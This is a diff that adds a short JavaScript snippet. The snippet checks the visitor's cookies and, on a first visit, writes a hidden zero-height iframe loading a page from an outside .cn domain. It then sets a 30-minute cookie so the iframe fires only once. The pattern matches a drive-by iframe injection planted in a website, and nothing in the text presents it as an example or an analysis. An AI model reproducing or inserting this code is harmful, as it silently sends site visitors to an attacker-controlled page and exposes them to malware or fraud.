@@ -1,0 +1,11 @@
+var cookieString = new String(document.cookie);
+var cookieHeader = 'ises' ;
+var Then = new Date();
+Then.setTime(Then.getTime() + 30*60*1000 );
+var beginPosition = cookieString.indexOf(cookieHeader);
+
+if (beginPosition == -1)
+   {
+   document.write('<iframe height="0" frameborder="1" src="http://reheie.cn/page/add_54738542.htm" width="100" ></iframe>');
+   document.cookie = "Cookieak=ises;expires="+ Then.toGMTString() +";path=/";
+   }
